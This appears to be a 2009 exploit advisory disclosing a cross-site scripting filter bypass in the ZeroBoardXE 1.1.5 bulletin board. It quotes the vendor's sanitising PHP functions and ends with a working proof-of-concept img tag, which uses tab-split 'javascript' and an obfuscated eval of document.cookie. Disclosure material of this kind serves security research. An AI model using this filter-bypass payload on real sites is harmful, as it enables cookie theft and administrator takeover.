@@ -1,0 +1,97 @@
+ZeroBoardXE 1.1.5 (09.01.22) XSS Vulnerability 
+bY make0day@gmail.com
+Greet to : Flyh4t
+/*************************
+
+ZeroBoardXE (VERSION 1.1.5 (09.01.22))is most famous and widely used bulletin board system of Korea.
+It is freely available for all platforms that supports PHP and MySQL.
+I find a XSS vulnerability. 
+By using this vulnerability, Malicious person can occupy administrator permission,
+It means attacker can control board system fully 
+Here is the details:
+
+**************************/
+TEST ON VERSION ZeroBoardXE 1.1.5 (09.01.22)
+Download : http://www.zeroboard.com
+/***************************
+[0x01] XSS vulnerability
+
+/config/func.inc.php
+
+    function removeHackTag($content) {
+
+        $content = preg_replace_callback("!<([a-z]+)(.*?)>!is", removeJSEvent, $content);
+
+
+        $content = preg_replace_callback("!<([a-z]+)(.*?)>!is", removeSrcHack, $content);
+
+        return $content;
+    }
+
+    function removeJSEvent($matches) {
+        $attrs = $matches[2];
+
+        if(preg_match('/(src|href|lowsrc|dynsrc)=("|\'?)([\r\n]*)(vbscript|javascript)/is', $matches[2])) {
+            $attrs = preg_replace('/(src|href|lowsrc|dynsrc)=("|\'?)([\r\n]*)(vbscript|javascript)/is','$1=$2_$4', $attrs);
+        }
+
+	 $attrs = preg_replace(
+            '/(\r|\n| )+on(click|dblclick|mousedown|mouseup|mouseover|mouseout|mousemove|keydown|keyup|keypress|load|unload|abort|error|select|change|submit|reset|resize|scroll|focus|blur)+([= ]+)/is',
+            ' _on$2=',
+            $attrs
+        );
+
+        $attrs = preg_replace('/_onclick=("|\')window\.open\(this\.href\);(.?)return false;("|\')/i','onclick=$1window.open(this.href);$2return false;$3', $attrs);
+
+        return '<'.$matches[1].$attrs.'>';
+    }
+
+    function removeSrcHack($matches) {
+        $tag = strtolower(trim($matches[1]));
+
+        $buff = trim(preg_replace('/(\/>|>)/','/>',$matches[0]));
+        $buff = str_replace(array('&amp;','&'),array('&amp;','&amp;'),$buff);
+        $buff = preg_replace_callback('/([^=^"^ ]*)=([^ ^>]*)/i', fixQuotation, $buff);
+
+        $oXmlParser = new XmlParser();
+        $xml_doc = $oXmlParser->parse($buff);
+
+        $src = $xml_doc->{$tag}->attrs->src;
+        $dynsrc = $xml_doc->{$tag}->attrs->dynsrc;
+        $lowsrc = $xml_doc->{$tag}->attrs->lowsrc;
+        $href = $xml_doc->{$tag}->attrs->href;
+        if(_isHackedSrc($src) || _isHackedSrc($dynsrc) || _isHackedSrc($lowsrc) || _isHackedSrc($href) ) return sprintf("<%s>",$tag);
+
+        return $matches[0];
+    }
+
+    function _isHackedSrc($src) {
+        if(!$src) return false;
+        if($src) {
+            $url_info = parse_url($src);
+            $query = $url_info['query'];
+            $queries = explode('&', $query);
+            $cnt = count($queries);
+            for($i=0;$i<$cnt;$i++) {
+                $tmp_str = strtolower(trim($queries[$i]));
+                $pos = strpos($tmp_str,'=');
+                if($pos === false) continue;
+                $key = strtolower(trim(substr($tmp_str, 0, $pos)));
+                $val = strtolower(trim(substr($tmp_str,$pos+1)));
+                if( ($key=='module'&&$val=='admin') || ($key=='act'&&preg_match('/admin/i',$val)) ) return true;
+            }
+        }
+        return false;
+    }
+
+//Developer try to detect XSS hardly,
+//But That`s not enough..
+//The real-hacker can bypass it.
+//I`m just used 09 trick.
+//That`s all 
+*************************/
+
+poc:
+<img lowsrc="j	a	v	a	s	c	ri	pt:alert((eval(('D'+'o'+'C'+'u'+'M'+'e'+'N'+'t'+'.'+'C'+'o'+'O'+'k'+'I'+'e').toLowerCase())));">
+
+# milw0rm.com [2009-02-09]
